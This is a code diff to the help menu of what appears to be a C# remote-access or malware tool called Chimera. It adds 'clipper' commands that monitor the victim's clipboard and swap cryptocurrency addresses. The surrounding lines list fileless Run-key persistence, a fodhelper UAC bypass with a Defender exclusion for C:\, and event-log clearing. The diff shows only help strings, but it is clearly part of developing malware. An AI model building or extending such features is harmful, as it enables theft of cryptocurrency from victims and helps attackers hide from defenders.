@@ -30,6 +30,11 @@ namespace Chimera.Commands
             sb.AppendLine("persist                  Fileless XOR blob -> staging dir + HKCU Run");
             sb.AppendLine("persist remove           Remove persistence blob and Run key");
             sb.AppendLine();
+            sb.AppendLine("-- Crypto Hijacking --");
+            sb.AppendLine("clipper start            Monitor clipboard, swap crypto addresses");
+            sb.AppendLine("clipper stop             Stop clipboard monitor");
+            sb.AppendLine("clipper status           Show state and swap addresses");
+            sb.AppendLine();
             sb.AppendLine("-- Evasion / Elevation --");
             sb.AppendLine("bypass [cmd]             UAC bypass via fodhelper + Defender C:\\ exclusion");
             sb.AppendLine("clearlogs                Stop EventLog service, clear Security/System/App logs");
